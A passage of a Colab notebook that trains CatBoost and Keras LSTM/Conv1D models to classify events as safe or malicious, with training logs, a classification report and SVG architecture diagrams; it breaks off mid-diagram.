            "144:\tlearn: 0.0082525\ttotal: 1.65s\tremaining: 626ms\n",
            "145:\tlearn: 0.0081189\ttotal: 1.66s\tremaining: 615ms\n",
            "146:\tlearn: 0.0080974\ttotal: 1.67s\tremaining: 602ms\n",
            "147:\tlearn: 0.0079942\ttotal: 1.68s\tremaining: 591ms\n",
            "148:\tlearn: 0.0079432\ttotal: 1.69s\tremaining: 579ms\n",
            "149:\tlearn: 0.0078827\ttotal: 1.7s\tremaining: 567ms\n",
            "150:\tlearn: 0.0077599\ttotal: 1.73s\tremaining: 561ms\n",
            "151:\tlearn: 0.0075093\ttotal: 1.75s\tremaining: 552ms\n",
            "152:\tlearn: 0.0074022\ttotal: 1.78s\tremaining: 547ms\n",
            "153:\tlearn: 0.0072329\ttotal: 1.79s\tremaining: 536ms\n",
            "154:\tlearn: 0.0071949\ttotal: 1.8s\tremaining: 524ms\n",
            "155:\tlearn: 0.0071678\ttotal: 1.82s\tremaining: 513ms\n",
            "156:\tlearn: 0.0070607\ttotal: 1.83s\tremaining: 501ms\n",
            "157:\tlearn: 0.0069148\ttotal: 1.86s\tremaining: 495ms\n",
            "158:\tlearn: 0.0067987\ttotal: 1.88s\tremaining: 484ms\n",
            "159:\tlearn: 0.0067729\ttotal: 1.89s\tremaining: 472ms\n",
            "160:\tlearn: 0.0067131\ttotal: 1.89s\tremaining: 459ms\n",
            "161:\tlearn: 0.0066922\ttotal: 1.9s\tremaining: 446ms\n",
            "162:\tlearn: 0.0065787\ttotal: 1.91s\tremaining: 434ms\n",
            "163:\tlearn: 0.0064183\ttotal: 1.92s\tremaining: 422ms\n",
            "164:\tlearn: 0.0063486\ttotal: 1.93s\tremaining: 409ms\n",
            "165:\tlearn: 0.0062109\ttotal: 1.94s\tremaining: 397ms\n",
            "166:\tlearn: 0.0061933\ttotal: 1.95s\tremaining: 385ms\n",
            "167:\tlearn: 0.0061221\ttotal: 1.96s\tremaining: 373ms\n",
            "168:\tlearn: 0.0060010\ttotal: 1.98s\tremaining: 362ms\n",
            "169:\tlearn: 0.0059547\ttotal: 1.99s\tremaining: 350ms\n",
            "170:\tlearn: 0.0059386\ttotal: 2s\tremaining: 339ms\n",
            "171:\tlearn: 0.0058790\ttotal: 2s\tremaining: 326ms\n",
            "172:\tlearn: 0.0057854\ttotal: 2.03s\tremaining: 316ms\n",
            "173:\tlearn: 0.0055962\ttotal: 2.06s\tremaining: 308ms\n",
            "174:\tlearn: 0.0055801\ttotal: 2.07s\tremaining: 295ms\n",
            "175:\tlearn: 0.0053901\ttotal: 2.08s\tremaining: 283ms\n",
            "176:\tlearn: 0.0053726\ttotal: 2.09s\tremaining: 271ms\n",
            "177:\tlearn: 0.0053154\ttotal: 2.1s\tremaining: 259ms\n",
            "178:\tlearn: 0.0052667\ttotal: 2.11s\tremaining: 247ms\n",
            "179:\tlearn: 0.0051487\ttotal: 2.12s\tremaining: 235ms\n",
            "180:\tlearn: 0.0051356\ttotal: 2.13s\tremaining: 224ms\n",
            "181:\tlearn: 0.0050014\ttotal: 2.14s\tremaining: 212ms\n",
            "182:\tlearn: 0.0049834\ttotal: 2.14s\tremaining: 199ms\n",
            "183:\tlearn: 0.0049356\ttotal: 2.15s\tremaining: 187ms\n",
            "184:\tlearn: 0.0048685\ttotal: 2.16s\tremaining: 175ms\n",
            "185:\tlearn: 0.0048336\ttotal: 2.17s\tremaining: 163ms\n",
            "186:\tlearn: 0.0047732\ttotal: 2.17s\tremaining: 151ms\n",
            "187:\tlearn: 0.0047581\ttotal: 2.18s\tremaining: 139ms\n",
            "188:\tlearn: 0.0046623\ttotal: 2.18s\tremaining: 127ms\n",
            "189:\tlearn: 0.0046499\ttotal: 2.19s\tremaining: 115ms\n",
            "190:\tlearn: 0.0045673\ttotal: 2.19s\tremaining: 103ms\n",
            "191:\tlearn: 0.0045550\ttotal: 2.19s\tremaining: 91.4ms\n",
            "192:\tlearn: 0.0045106\ttotal: 2.2s\tremaining: 79.7ms\n",
            "193:\tlearn: 0.0044328\ttotal: 2.2s\tremaining: 68.1ms\n",
            "194:\tlearn: 0.0043992\ttotal: 2.21s\tremaining: 56.6ms\n",
            "195:\tlearn: 0.0043884\ttotal: 2.21s\tremaining: 45.1ms\n",
            "196:\tlearn: 0.0043085\ttotal: 2.21s\tremaining: 33.7ms\n",
            "197:\tlearn: 0.0042786\ttotal: 2.22s\tremaining: 22.4ms\n",
            "198:\tlearn: 0.0041576\ttotal: 2.22s\tremaining: 11.2ms\n",
            "199:\tlearn: 0.0040820\ttotal: 2.23s\tremaining: 0us\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<catboost.core.CatBoostRegressor at 0x7c6489007b20>"
            ]
          },
          "metadata": {},
          "execution_count": 88
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "preds_model_cat=model_cat.predict(val_X_kill)"
      ],
      "metadata": {
        "id": "l4XkqPCXgo3r"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import confusion_matrix\n",
        "score_cat=np.round(np.clip(preds_model_cat, 0,1)).astype('int')\n",
        "mt_cat = confusion_matrix(val_y.astype('int'), score_cat)\n",
        "mt_cat"
      ],
      "metadata": {
        "id": "1J8vPGN8hGTi",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "9e77ad32-fc6e-4c00-f92c-44a15312bb43"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([[12,  3],\n",
              "       [ 1,  0]])"
            ]
          },
          "metadata": {},
          "execution_count": 90
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import precision_recall_curve\n",
        "precision, recall, _ = precision_recall_curve(val_y.astype('int'), score_cat)\n"
      ],
      "metadata": {
        "id": "0h07Ng4iYXbW"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import classification_report\n",
        "target_names = ['Безопасное событие', 'Вредоносное событие']\n",
        "print(classification_report(score_cat, val_y.astype('int'), target_names=target_names))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Ap2Vm8J8ZT4M",
        "outputId": "27ab927e-a2de-49d2-86b0-f982c0b6369b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "                     precision    recall  f1-score   support\n",
            "\n",
            " Безопасное событие       0.80      0.92      0.86        13\n",
            "Вредоносное событие       0.00      0.00      0.00         3\n",
            "\n",
            "           accuracy                           0.75        16\n",
            "          macro avg       0.40      0.46      0.43        16\n",
            "       weighted avg       0.65      0.75      0.70        16\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Нейронные сети**"
      ],
      "metadata": {
        "id": "1CARyfh6j-Wx"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from tensorflow import keras\n",
        "\n",
        "BATCH_SIZE = 8\n",
        "SHUFFLE_BUFFER = 100\n",
        "\n",
        "train_Xds = tf.data.Dataset.from_tensor_slices((train_X, train_y)).\\\n",
        "                    shuffle(SHUFFLE_BUFFER).batch(BATCH_SIZE).prefetch(1)\n",
        "val_Xds = tf.data.Dataset.from_tensor_slices((val_X, val_y)).\\\n",
        "                    shuffle(SHUFFLE_BUFFER).batch(BATCH_SIZE).prefetch(1)"
      ],
      "metadata": {
        "id": "dIgyH8CBiMEr"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Иницилизация архитектур"
      ],
      "metadata": {
        "id": "DZ6q8r_MrRwG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def model_simplest(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model_simplest = keras.models.Sequential([\n",
        "    keras.layers.LSTM(32, dropout=0.2, recurrent_dropout=0.2, input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "    keras.layers.Dense(units=1, activation='sigmoid')\n",
        "    ])\n",
        "    return model_simplest\n",
        "\n",
        "\n",
        "def model_deep(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model = keras.models.Sequential([\n",
        "    keras.layers.LSTM(128, dropout=0.2, recurrent_dropout=0.2, input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(128, activation='relu'),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(16, activation='relu'),\n",
        "    keras.layers.Dense(1, activation='sigmoid')\n",
        "    ])\n",
        "    return model\n",
        "\n",
        "\n",
        "def model_deeper(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model = keras.models.Sequential([\n",
        "    keras.layers.LSTM(128, dropout=0.2, recurrent_dropout=0.2,\n",
        "                      input_shape=[MAX_TIMESTEPS, OH_DIMENSION], return_sequences=True),\n",
        "    keras.layers.LSTM(128, dropout=0.2, recurrent_dropout=0.2, input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(128, activation='relu'),\n",
        "    #keras.layers.Dropout(0.5),\n",
        "    keras.layers.Dense(16, activation='relu'),\n",
        "    keras.layers.Dense(1, activation='sigmoid')\n",
        "    ])\n",
        "    return model\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "def model_conv_rnn(MAX_TIMESTEPS, OH_DIMENSION):\n",
        "    model = keras.models.Sequential([\n",
        "                keras.layers.Conv1D(filters=64, kernel_size=3, activation='relu',\n",
        "                                    input_shape=[MAX_TIMESTEPS, OH_DIMENSION]),\n",
        "                keras.layers.MaxPooling1D(pool_size=2),\n",
        "                keras.layers.LSTM(64),\n",
        "                keras.layers.Dropout(0.5),\n",
        "                keras.layers.Dense(32, activation='relu'),\n",
        "                keras.layers.Dense(1, activation='sigmoid')\n",
        "    ])\n",
        "    return model\n"
      ],
      "metadata": {
        "id": "00lGRoruii4o"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "models = { 'simplest': model_simplest(MAX_TIMESTEPS, N),\n",
        "  'deep': model_deep(MAX_TIMESTEPS, N),\n",
        "  'deeper': model_deeper(MAX_TIMESTEPS, N),\n",
        "  'conv1d': model_conv_rnn(MAX_TIMESTEPS, N)}"
      ],
      "metadata": {
        "id": "U3xgQWs2ir7W"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Покажем архитектуры"
      ],
      "metadata": {
        "id": "vEkRxffey3hV"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from IPython.display import SVG\n",
        "from keras.utils.vis_utils import model_to_dot\n",
        "for i in models.values():\n",
        "  display (SVG(model_to_dot(i).create(prog='dot', format='svg')))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "PYwl7FOvwcaV",
        "outputId": "a338096b-80ca-4d30-cdf6-eeb017fece79"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"232pt\" height=\"255pt\" viewBox=\"0.00 0.00 174.00 191.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 187)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-187 170,-187 170,4 -4,4\"/>\n<!-- 136771227134096 -->\n<g id=\"node1\" class=\"node\">\n<title>136771227134096</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-146.5 0,-182.5 166,-182.5 166,-146.5 0,-146.5\"/>\n<text text-anchor=\"middle\" x=\"44.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_5_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"89,-146.5 89,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"127.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 136771227129344 -->\n<g id=\"node2\" class=\"node\">\n<title>136771227129344</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-73.5 29.5,-109.5 136.5,-109.5 136.5,-73.5 29.5,-73.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_5</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-73.5 83.5,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 136771227134096&#45;&gt;136771227129344 -->\n<g id=\"edge1\" class=\"edge\">\n<title>136771227134096-&gt;136771227129344</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-146.31C83,-138.29 83,-128.55 83,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-119.53 83,-109.53 79.5,-119.53 86.5,-119.53\"/>\n</g>\n<!-- 136771227131936 -->\n<g id=\"node3\" class=\"node\">\n<title>136771227131936</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"27.5,-0.5 27.5,-36.5 138.5,-36.5 138.5,-0.5 27.5,-0.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_9</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"88.5,-0.5 88.5,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"113.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771227129344&#45;&gt;136771227131936 -->\n<g id=\"edge2\" class=\"edge\">\n<title>136771227129344-&gt;136771227131936</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-73.31C83,-65.29 83,-55.55 83,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-46.53 83,-36.53 79.5,-46.53 86.5,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"232pt\" height=\"449pt\" viewBox=\"0.00 0.00 174.00 337.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 333)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-333 170,-333 170,4 -4,4\"/>\n<!-- 136771226877616 -->\n<g id=\"node1\" class=\"node\">\n<title>136771226877616</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-292.5 0,-328.5 166,-328.5 166,-292.5 0,-292.5\"/>\n<text text-anchor=\"middle\" x=\"44.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_6_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"89,-292.5 89,-328.5 \"/>\n<text text-anchor=\"middle\" x=\"127.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 136771227138704 -->\n<g id=\"node2\" class=\"node\">\n<title>136771227138704</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-219.5 29.5,-255.5 136.5,-255.5 136.5,-219.5 29.5,-219.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_6</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-219.5 83.5,-255.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 136771226877616&#45;&gt;136771227138704 -->\n<g id=\"edge1\" class=\"edge\">\n<title>136771226877616-&gt;136771227138704</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-292.31C83,-284.29 83,-274.55 83,-265.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-265.53 83,-255.53 79.5,-265.53 86.5,-265.53\"/>\n</g>\n<!-- 136771227305872 -->\n<g id=\"node3\" class=\"node\">\n<title>136771227305872</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"24,-146.5 24,-182.5 142,-182.5 142,-146.5 24,-146.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_10</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"92,-146.5 92,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"117\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771227138704&#45;&gt;136771227305872 -->\n<g id=\"edge2\" class=\"edge\">\n<title>136771227138704-&gt;136771227305872</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-219.31C83,-211.29 83,-201.55 83,-192.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-192.53 83,-182.53 79.5,-192.53 86.5,-192.53\"/>\n</g>\n<!-- 136771227306832 -->\n<g id=\"node4\" class=\"node\">\n<title>136771227306832</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"24,-73.5 24,-109.5 142,-109.5 142,-73.5 24,-73.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_11</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"92,-73.5 92,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"117\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771227305872&#45;&gt;136771227306832 -->\n<g id=\"edge3\" class=\"edge\">\n<title>136771227305872-&gt;136771227306832</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-146.31C83,-138.29 83,-128.55 83,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-119.53 83,-109.53 79.5,-119.53 86.5,-119.53\"/>\n</g>\n<!-- 136771227307744 -->\n<g id=\"node5\" class=\"node\">\n<title>136771227307744</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"24,-0.5 24,-36.5 142,-36.5 142,-0.5 24,-0.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_12</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"92,-0.5 92,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"117\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771227306832&#45;&gt;136771227307744 -->\n<g id=\"edge4\" class=\"edge\">\n<title>136771227306832-&gt;136771227307744</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-73.31C83,-65.29 83,-55.55 83,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-46.53 83,-36.53 79.5,-46.53 86.5,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"232pt\" height=\"547pt\" viewBox=\"0.00 0.00 174.00 410.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 406)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-406 170,-406 170,4 -4,4\"/>\n<!-- 136771214906256 -->\n<g id=\"node1\" class=\"node\">\n<title>136771214906256</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-365.5 0,-401.5 166,-401.5 166,-365.5 0,-365.5\"/>\n<text text-anchor=\"middle\" x=\"44.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_7_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"89,-365.5 89,-401.5 \"/>\n<text text-anchor=\"middle\" x=\"127.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 136771286007472 -->\n<g id=\"node2\" class=\"node\">\n<title>136771286007472</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-292.5 29.5,-328.5 136.5,-328.5 136.5,-292.5 29.5,-292.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_7</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-292.5 83.5,-328.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 136771214906256&#45;&gt;136771286007472 -->\n<g id=\"edge1\" class=\"edge\">\n<title>136771214906256-&gt;136771286007472</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-365.31C83,-357.29 83,-347.55 83,-338.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-338.53 83,-328.53 79.5,-338.53 86.5,-338.53\"/>\n</g>\n<!-- 136771214686048 -->\n<g id=\"node3\" class=\"node\">\n<title>136771214686048</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"29.5,-219.5 29.5,-255.5 136.5,-255.5 136.5,-219.5 29.5,-219.5\"/>\n<text text-anchor=\"middle\" x=\"56.5\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_8</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"83.5,-219.5 83.5,-255.5 \"/>\n<text text-anchor=\"middle\" x=\"110\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 136771286007472&#45;&gt;136771214686048 -->\n<g id=\"edge2\" class=\"edge\">\n<title>136771286007472-&gt;136771214686048</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-292.31C83,-284.29 83,-274.55 83,-265.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-265.53 83,-255.53 79.5,-265.53 86.5,-265.53\"/>\n</g>\n<!-- 136771214902608 -->\n<g id=\"node4\" class=\"node\">\n<title>136771214902608</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"24,-146.5 24,-182.5 142,-182.5 142,-146.5 24,-146.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_13</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"92,-146.5 92,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"117\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771214686048&#45;&gt;136771214902608 -->\n<g id=\"edge3\" class=\"edge\">\n<title>136771214686048-&gt;136771214902608</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-219.31C83,-211.29 83,-201.55 83,-192.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-192.53 83,-182.53 79.5,-192.53 86.5,-192.53\"/>\n</g>\n<!-- 136771214903568 -->\n<g id=\"node5\" class=\"node\">\n<title>136771214903568</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"24,-73.5 24,-109.5 142,-109.5 142,-73.5 24,-73.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_14</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"92,-73.5 92,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"117\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771214902608&#45;&gt;136771214903568 -->\n<g id=\"edge4\" class=\"edge\">\n<title>136771214902608-&gt;136771214903568</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-146.31C83,-138.29 83,-128.55 83,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-119.53 83,-109.53 79.5,-119.53 86.5,-119.53\"/>\n</g>\n<!-- 136771214904480 -->\n<g id=\"node6\" class=\"node\">\n<title>136771214904480</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"24,-0.5 24,-36.5 142,-36.5 142,-0.5 24,-0.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_15</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"92,-0.5 92,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"117\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771214903568&#45;&gt;136771214904480 -->\n<g id=\"edge5\" class=\"edge\">\n<title>136771214903568-&gt;136771214904480</title>\n<path fill=\"none\" stroke=\"black\" d=\"M83,-73.31C83,-65.29 83,-55.55 83,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.5,-46.53 83,-36.53 79.5,-46.53 86.5,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.SVG object>"
            ],
            "image/svg+xml": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300pt\" height=\"644pt\" viewBox=\"0.00 0.00 225.00 483.00\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(0.75 0.75) rotate(0) translate(4 479)\">\n<title>G</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-479 221,-479 221,4 -4,4\"/>\n<!-- 136771226286496 -->\n<g id=\"node1\" class=\"node\">\n<title>136771226286496</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"18,-438.5 18,-474.5 199,-474.5 199,-438.5 18,-438.5\"/>\n<text text-anchor=\"middle\" x=\"70\" y=\"-452.8\" font-family=\"Times,serif\" font-size=\"14.00\">conv1d_1_input</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"122,-438.5 122,-474.5 \"/>\n<text text-anchor=\"middle\" x=\"160.5\" y=\"-452.8\" font-family=\"Times,serif\" font-size=\"14.00\">InputLayer</text>\n</g>\n<!-- 136771214566128 -->\n<g id=\"node2\" class=\"node\">\n<title>136771214566128</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"42.5,-365.5 42.5,-401.5 174.5,-401.5 174.5,-365.5 42.5,-365.5\"/>\n<text text-anchor=\"middle\" x=\"77.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">conv1d_1</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"112.5,-365.5 112.5,-401.5 \"/>\n<text text-anchor=\"middle\" x=\"143.5\" y=\"-379.8\" font-family=\"Times,serif\" font-size=\"14.00\">Conv1D</text>\n</g>\n<!-- 136771226286496&#45;&gt;136771214566128 -->\n<g id=\"edge1\" class=\"edge\">\n<title>136771226286496-&gt;136771214566128</title>\n<path fill=\"none\" stroke=\"black\" d=\"M108.5,-438.31C108.5,-430.29 108.5,-420.55 108.5,-411.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"112,-411.53 108.5,-401.53 105,-411.53 112,-411.53\"/>\n</g>\n<!-- 136771226147984 -->\n<g id=\"node3\" class=\"node\">\n<title>136771226147984</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"0,-292.5 0,-328.5 217,-328.5 217,-292.5 0,-292.5\"/>\n<text text-anchor=\"middle\" x=\"58\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">max_pooling1d_1</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"116,-292.5 116,-328.5 \"/>\n<text text-anchor=\"middle\" x=\"166.5\" y=\"-306.8\" font-family=\"Times,serif\" font-size=\"14.00\">MaxPooling1D</text>\n</g>\n<!-- 136771214566128&#45;&gt;136771226147984 -->\n<g id=\"edge2\" class=\"edge\">\n<title>136771214566128-&gt;136771226147984</title>\n<path fill=\"none\" stroke=\"black\" d=\"M108.5,-365.31C108.5,-357.29 108.5,-347.55 108.5,-338.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"112,-338.53 108.5,-328.53 105,-338.53 112,-338.53\"/>\n</g>\n<!-- 136771214572032 -->\n<g id=\"node4\" class=\"node\">\n<title>136771214572032</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"55,-219.5 55,-255.5 162,-255.5 162,-219.5 55,-219.5\"/>\n<text text-anchor=\"middle\" x=\"82\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">lstm_9</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"109,-219.5 109,-255.5 \"/>\n<text text-anchor=\"middle\" x=\"135.5\" y=\"-233.8\" font-family=\"Times,serif\" font-size=\"14.00\">LSTM</text>\n</g>\n<!-- 136771226147984&#45;&gt;136771214572032 -->\n<g id=\"edge3\" class=\"edge\">\n<title>136771226147984-&gt;136771214572032</title>\n<path fill=\"none\" stroke=\"black\" d=\"M108.5,-292.31C108.5,-284.29 108.5,-274.55 108.5,-265.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"112,-265.53 108.5,-255.53 105,-265.53 112,-265.53\"/>\n</g>\n<!-- 136771226283088 -->\n<g id=\"node5\" 